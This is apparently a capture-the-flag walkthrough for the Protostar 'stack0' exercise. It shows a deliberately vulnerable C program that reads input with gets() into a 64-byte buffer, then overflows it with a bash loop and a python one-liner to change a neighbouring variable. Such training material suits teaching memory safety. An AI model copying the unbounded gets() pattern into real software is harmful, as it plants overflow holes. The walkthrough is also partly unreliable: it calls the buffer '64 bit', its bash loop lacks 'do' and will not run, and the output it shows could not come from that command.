Stack0

# Stack 0

## Problem
This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at /opt/protostar/bin/stack0

## Code provided

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
## Binary execution
![4052c843babad3a3f3a121fa05eaf88f.png](/images/protostar/f6f2ffd342c546f686de2632a76ac35a.png)

## Solution 
Since the code show how `char buffer` only hold `[64]` bit value, lets run this first with 3 bit value. Next, we going to run the binary with value up to 64. To do this, we can use bash script to generate/print value 64 above.



```bash
user@protostar:~$ for a in {1..65}; echo -n a; done

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

you have changed the 'modified' variable
```

Ok, looks like we successfully overwrite the memory area by exploiting the memory buffer overflow technique. 

To make the payload in a form of human readable and beautiful, lets just use python. 

```python
python -c "print 'A' * 65" | /opt/protostar/bin/stack0
```

